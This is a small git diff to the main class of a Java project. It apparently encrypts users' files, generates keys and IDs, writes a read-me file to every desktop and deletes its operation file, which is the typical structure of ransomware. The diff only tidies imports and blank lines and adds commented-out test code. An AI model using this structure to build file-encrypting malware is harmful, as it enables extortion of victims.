@@ -1,6 +1,5 @@
 package main;
 
-
 import encryptionAndDecryption.Encryption;
 import enums.To;
 import files.CreateReadMeFile;
@@ -8,7 +7,6 @@ import files.GetFiles;
 import genrators.GenerateID;
 import genrators.GenerateKey;
 import gui.Dialogs;
-import helpers.Constants;
 import helpers.FunctionsHelper;
 
 import java.io.File;
@@ -47,7 +45,6 @@ public class Main {
 
         }
 
-
         // Crete read me file in desktop
         ArrayList<File> desktops = files.getDesktops();
         for (File desktop : desktops) {
@@ -62,6 +59,11 @@ public class Main {
         FunctionsHelper.deleteOperationFile(operationFile);
 
         // Test
+//        try {
+//            readMeFile.create(".");
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
 //        File file = new File("tests/test.txt");
 //        System.out.println(file.canRead());
 //        EncryptionAndDecryption.encryptionAndDecryption(Cipher.ENCRYPT_MODE,"1234567891234567", file);
